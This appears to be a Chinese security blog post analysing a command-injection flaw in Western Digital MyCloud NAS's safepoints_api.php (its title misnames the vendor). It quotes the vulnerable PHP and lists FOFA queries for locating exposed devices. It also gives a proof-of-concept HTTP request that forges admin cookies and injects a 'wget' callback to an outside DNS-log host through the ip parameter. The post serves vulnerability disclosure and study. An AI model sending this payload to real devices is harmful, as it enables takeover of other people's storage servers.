---
title: "西部数码 NAS safepoints_api.php 命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-safepoints_api-rce.html
asset_dir: assets/西部数码-nas-safepoints_api.php-命令执行漏洞
---

# 西部数码 NAS safepoints\_api.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/9/10 13:02
* 642浏览
* [0评论](#comment)
* 23分钟阅读

深入探索

防火墙软件

安全

编码转换工具


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS safepoints\_api.php中存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

漏洞扫描服务

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
>
> body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "

# 漏洞分析

直接看 `safepoints_api.php` 其业务实现逻辑如下

```
<?php
session_start();
$r = new stdClass();
$r->success = false;

include ("../lib/login_checker.php");

/* login_check() return 0: no login, 1: login, admin, 2: login, normal user */
if (login_check() != 1)
{
    echo json_encode($r);
    exit;
}

define('SAFEPOINTS_NETWORK_DISCOVER', '/var/www/xml/discover_remote_nas_devices.xml');
define('SAFEPOINTS_LIST', '/var/www/xml/safepoint_list.xml');
define('SAFEPOINTS_SHARE_LIST', '/var/www/xml/discover_local_nas_share_%s.xml');
define('SAFEPOINTS_RESTORE', '/var/www/xml/sprb.xml');
define('SAFEPOINTS_PASSWORD', '/tmp/_safepoints_pwd.xml');

$action = $_POST['action'];
if ($action == "")  $action = $_GET['action'];
.....
switch ($action)
{
    case "network_get_sharefolder":
{
    $r->status = -1;
    $cnt = 0;

    $ip = $_POST['ip'];
    $user = $_POST['user'];
    $pwd = $_POST['pwd'];

    $cmd = "killall -SIGKILL discover_dev";
    pclose(popen($cmd, 'r'));

    $_filename = sprintf(SAFEPOINTS_SHARE_LIST, $ip);
    @unlink($_filename);
    $cmd = sprintf("discover_dev -q %s -u '%s' -p '%s'", $ip, $user, $pwd);
    pclose(popen($cmd, 'r'));
```

当`$_POST['action']` = `network_get_sharefolder`时，`$ip = $_POST['ip']`、`$user = $_POST['user']`、`$pwd = $_POST['pwd']`这几个参数均是直接拼接进$cmd中，然后调用**popen**进行执行，期间对这几个参数没有过滤或校验，导致了[命令注入](https://mrxn.net/tag/rce)漏洞。尽管此漏洞需要管理员权限才能触发，但可以结合`login_check`的权限绕过达到 RCE的效果。

漏洞扫描服务

类似的问题同样存在于`usb_get_safepoints` `usb_do_recover` `network_share_auth` `network_get_safepoints` `network_do_recover` 操作中，其中`$backup_type` `$restore_source` `$taskname` `$old_taskname`等参数也未被转义。

usb\_get\_safepoints

[![西部数码 NAS safepoints_api.php 命令执行漏洞](images/img-001-fddaf56eca00.webp)](https://image.mrxn.net/89dc082001ba424bbd07651fa87a199d.webp)

usb\_do\_recover

[![西部数码 NAS safepoints_api.php 命令执行漏洞](images/img-002-db58b7e6baa6.webp)](https://image.mrxn.net/a815e7e3913b4a1483fc2e41d9d1d5e3.webp)

network\_share\_auth

[![西部数码 NAS safepoints_api.php 命令执行漏洞](images/img-003-6a3fd4bd2df0.webp)](https://image.mrxn.net/7a13387b91e14451bc7b7f5a4fc10e2e.webp)

network\_get\_safepoints

[![西部数码 NAS safepoints_api.php 命令执行漏洞](images/img-004-80569c06be15.webp)](https://image.mrxn.net/1b07e05a41fe4727868e308e1be18d1b.webp)

network\_do\_recover

[![西部数码 NAS safepoints_api.php 命令执行漏洞](images/img-005-dfeb5f6cbe90.webp)](https://image.mrxn.net/560489668ed34175a911a4bea181ea3c.webp)

# 漏洞复现

> 需要注意source\_dir应为数组形式，否则foreach循环判断会出错
>
> 漏洞扫描服务

```
POST /web/addons/safepoints_api.php HTTP/1.1
Host: west-nas.mrxn.ent
Cookie: isAdmin=1;username=admin
Content-Type: application/x-www-form-urlencoded

ip=;wget dnslog.pt;&action=network_get_sharefolder
```

[![西部数码 NAS safepoints_api.php 命令执行漏洞](images/img-006-f5a49d73f21f.webp)](https://image.mrxn.net/f90926ec77004c57b00b1115a7cbbd9f.webp)

成功在DNSLOG平台收到DNS和HTTP请求

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#php](https://mrxn.net/tag/php)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[西部数码 NAS safepoints\_api.php 命令执行漏洞](https://mrxn.net/jswz/west-nas-safepoints_api-rce.html)  
文章链接：<https://mrxn.net/jswz/west-nas-safepoints_api-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

安全工具开发

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-safepoints\_api-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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